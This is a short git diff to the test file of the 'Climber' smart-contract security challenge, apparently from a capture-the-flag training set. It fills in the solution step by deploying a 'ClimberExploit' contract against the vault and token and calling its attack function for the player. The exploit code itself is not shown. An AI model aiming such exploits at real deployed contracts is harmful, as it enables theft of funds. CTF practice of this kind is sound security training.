@@ -25,6 +25,7 @@ describe('[Challenge] Climber', function () {
             { kind: 'uups' }
         );
 
+
         expect(await vault.getSweeper()).to.eq(sweeper.address);
         expect(await vault.getLastWithdrawalTimestamp()).to.be.gt(0);
         expect(await vault.owner()).to.not.eq(ethers.constants.AddressZero);
@@ -58,6 +59,12 @@ describe('[Challenge] Climber', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        exploit = await (await ethers.getContractFactory('ClimberExploit', player)).deploy(
+            vault.address, 
+            token.address
+            );
+        await exploit.attack(player.address);
+        
     });
 
     after(async function () {
